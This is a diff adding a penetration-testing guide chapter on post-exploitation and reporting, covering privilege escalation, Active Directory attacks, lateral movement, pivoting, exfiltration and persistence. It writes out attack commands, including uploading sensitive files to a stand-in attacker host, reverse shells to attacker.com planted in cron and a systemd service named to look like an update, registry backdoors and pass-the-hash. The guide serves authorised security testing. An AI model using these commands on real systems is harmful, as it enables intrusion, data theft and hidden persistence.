@@ -1,0 +1,97 @@
+8. Post-Exploitation & Reporting
+8.1 Linux Privilege Escalation
+Enumeration Scripts
+LinPEAS (Linux Privilege Escalation Awesome Script):
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh# Or download and runwget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.shchmod +x linpeas.sh./linpeas.sh
+LinEnum:
+./LinEnum.sh -r report.txt -e /tmp/ -t
+Linux Exploit Suggester:
+./linux-exploit-suggester.sh
+Manual Checks
+# Basic infowhoamiiduname -acat /etc/os-release# Sudo permissionssudo -l# SUID/SGID binariesfind / -perm -4000 -type f 2>/dev/nullfind / -perm -2000 -type f 2>/dev/null# Writable filesfind / -writable -type f 2>/dev/null# Cron jobscat /etc/crontabls -la /etc/cron.*find /var/spool/cron -type f 2>/dev/null# Running processesps aux# Network connectionsnetstat -tulpnss -tulpn# Installed packagesrpm -qa | grep -i kerneldpkg -l | grep -i kernel# Check for credentials in filesgrep -r "password" /etc/ 2>/dev/nullgrep -r "passwd" /home/ 2>/dev/nullfind /home -name ".ssh" -type d 2>/dev/null
+Common Privilege Escalation Vectors
+SUID binary exploitation (GTFOBins)
+Sudo misconfigurations
+Kernel exploits
+Writable /etc/passwd or /etc/shadow
+Cron job abuse
+Path hijacking
+LD_PRELOAD exploitation
+Docker group membership
+8.2 Windows Privilege Escalation
+Enumeration Scripts
+WinPEAS:
+winpeas.exewinpeas.exe cmd  # Command-line version
+Seatbelt:
+Seatbelt.exe -group=all
+PowerUp:
+. .\PowerUp.ps1Invoke-AllChecks
+Manual Checks
+# Basic infowhoamiwhoami /privwhoami /groupssysteminfo# User enumerationnet usernet localgroup administrators# Service enumerationsc querywmic service get name,displayname,pathname,startmode# Scheduled tasksschtasks /query /fo LIST /v# Registry checksreg query HKLM\SYSTEM\CurrentControlSet\Servicesreg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "DefaultPassword"# Unquoted service pathswmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\" | findstr /i /v """# AlwaysInstallElevatedreg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedreg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated# AutoLogon credentialsreg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+Common Windows Privilege Escalation Vectors
+Unquoted service paths
+Weak service permissions
+AlwaysInstallElevated
+Stored credentials (Credential Manager, browser saved passwords)
+UAC bypass techniques
+Token impersonation
+DLL hijacking
+Scheduled task abuse
+8.3 Active Directory Enumeration
+BloodHound:
+# Run SharpHound collector. .\SharpHound.ps1Invoke-BloodHound -CollectionMethod All# Or use the binarySharpHound.exe -c All
+BloodHound Analysis: - Upload ZIP to BloodHound GUI - Run pre-built queries: - Find Domain Admins - Shortest Paths to Domain Admin - Kerberoastable Users - AS-REP Roastable Users
+Common AD Attacks:
+# Kerberoasting. .\Invoke-Kerberoast.ps1Invoke-Kerberoast -OutputFormat hashcat | fl# AS-REP Roasting. .\ASREPRoast.ps1Invoke-ASREPRoast -Verbose# Password spraying# (Use with caution - account lockout risk)
+8.4 Lateral Movement
+# Pass-the-Hash (Impacket)psexec.py -hashes LM:NT admin@target.comwmiexec.py -hashes LM:NT admin@target.comsmbexec.py -hashes LM:NT admin@target.com# Pass-the-Ticketexport KRB5CCNAME=ticket.ccachepsexec.py -k -no-pass admin@target.com# SSH key-basedssh -i id_rsa user@target.com# RDP with Pass-the-Hash (xfreerdp)xfreerdp /v:target.com /u:admin /pth:NT_HASH
+8.5 Pivoting & Tunneling
+Chisel:
+# Server (attacker)chisel server -p 8080 --reverse# Client (compromised host)chisel client http://attacker.com:8080 R:socks
+Ligolo-ng:
+# Server (attacker)ligolo-ng -laddr 0.0.0.0:11601 -selfcert# Agent (compromised host)ligolo-ng-agent -connect attacker.com:11601 -ignore-cert
+SSH Tunneling:
+# Local port forwardssh -L 8080:internal.target.com:80 user@compromised.com# Remote port forwardssh -R 9090:localhost:8080 user@attacker.com# Dynamic SOCKS proxyssh -D 1080 user@compromised.com
+ProxyChains:
+# Configure /etc/proxychains.conf# socks5 127.0.0.1 1080proxychains nmap -sT -p 80,443 internal.target.com
+8.6 Data Exfiltration
+# Using HTTPS (stealthy)curl -X POST https://attacker.com/upload -d @sensitive_file.txt# DNS tunnelingdnscat2iodine# Using common toolsscp sensitive_file.txt attacker@attacker.com:/data/ftp attacker.comput sensitive_file.txt
+8.7 Persistence Techniques
+Linux Persistence
+# SSH authorized_keysecho "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys# Cron job(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -# Systemd servicecat > /etc/systemd/system/update.service << EOF[Unit]Description=System Update[Service]ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'Restart=always[Install]WantedBy=multi-user.targetEOFsystemctl enable update.service# LD_PRELOAD backdoor# (Requires root to modify /etc/ld.so.preload)
+Windows Persistence
+# Registry run keyreg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "C:\\path\\to\\backdoor.exe" /f# Scheduled taskschtasks /create /tn "SystemUpdate" /tr "C:\\path\\to\\backdoor.exe" /sc minute /mo 5# WMI event subscription# (Use PowerShell scripts for WMI persistence)# Service creationsc create Update binPath= "C:\\path\\to\\backdoor.exe" start= autosc start Update
+8.8 Reporting Structure
+Executive Summary
+High-level findings (Critical/High/Medium/Low counts)
+Business impact assessment
+Risk ratings with CVSS scores
+Remediation priorities
+Technical Report Sections
+Scope & Methodology
+Testing period
+In-scope/out-of-scope assets
+Testing methodology followed (PTES/OWASP/NIST)
+Tools used
+Findings Details (for each vulnerability)
+Vulnerability title and severity
+CVSS score and vector
+Affected URLs/endpoints
+Technical description
+Proof of Concept (screenshots, commands, request/response)
+Business impact
+Remediation recommendations
+References (CVE, CWE, OWASP)
+Appendices
+Test credentials used
+IP addresses tested
+Tools and versions
+Raw output samples
+Report Writing Best Practices
+Use clear, non-technical language for executive summary
+Include screenshots with annotations
+Provide reproducible steps with exact commands
+Prioritize findings by risk, not by discovery order
+Include remediation code examples where possible
+Verify all findings before inclusion
+Get peer review before delivery
